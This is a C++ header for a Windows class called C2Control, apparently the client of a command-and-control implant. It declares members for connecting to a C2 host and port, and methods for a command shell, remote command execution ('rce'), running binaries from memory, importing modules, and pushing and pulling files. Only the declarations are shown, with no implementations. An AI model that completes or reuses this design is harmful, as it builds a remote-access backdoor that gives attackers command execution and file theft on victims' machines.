
// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1
#pragma once
#define WIN32_LEAN_AND_MEAN

#if (_MSC_VER >=1915)
#define no_init_all deprecated
#endif


#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <array>
#include <memory>
#include "BinaryExecutor.h"



// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
//#pragma comment (lib, "Mswsock.lib")
//#pragma comment (lib, "AdvApi32.lib")
//#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
//#define WIN32_LEAN_AND_MEAN

#define DEFAULT_BUFLEN 2048

class C2Control
{
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	sockaddr_in addr;
	private:
		PCSTR c2Host, c2Port;
		WSADATA sData;
		SOCKET ConnectSocket;
		const char* exeptr;
		int rcvdCnt = 0;
		bool initialized;
		void handlePushFile();
		void handleUnrecognizedCommand();
		bool sockInit(WSADATA& sData);
		bool findHost();
		void initHints();
		void shutdown();
		void ioLoop();
		void ParseStringInput(char* buff, const int bufflen, char out[]);
		bool createSocket();
		bool test();


	public:
		bool isInitialized();

		void executeBinary(void* loc);

		void handleCommand(char* buf, int buflen);

		void handleCommandShell();

		void executeSingleCMD();

		void rce(const char* cmd);

		void handleImportModule();

		void handlePullFile();

		C2Control(PCSTR host, PCSTR port,const char* ptr);
		~C2Control();
		char* draftMenu();
		char* getLocalIP();
};

